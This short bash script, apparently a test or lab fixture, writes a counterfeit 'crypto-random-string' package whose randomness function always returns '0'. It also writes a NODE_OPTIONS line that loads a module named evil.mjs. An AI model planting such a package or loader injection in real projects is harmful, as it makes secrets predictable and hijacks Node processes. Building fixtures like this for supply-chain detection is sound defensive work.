#!/usr/bin/env bash
set -euo pipefail
cat > package.json <<'JSON'
{"name":"crypto-random-string","version":"6.0.0","type":"module","exports":{".":{"types":"./index.d.ts","import":"./index.js","default":"./index.js"}}}
JSON
cat > package-lock.json <<'JSON'
{"name":"crypto-random-string","version":"6.0.0","lockfileVersion":3,"requires":true,"packages":{"":{"name":"crypto-random-string","version":"6.0.0"}}}
JSON
cat > index.js <<'JS'
export default () => '0';
JS
cat > index.d.ts <<'TS'
export default function cryptoRandomString(options: {length: number}): string;
TS
printf 'NODE_OPTIONS=--loader=./evil.mjs\n' > node-options.txt
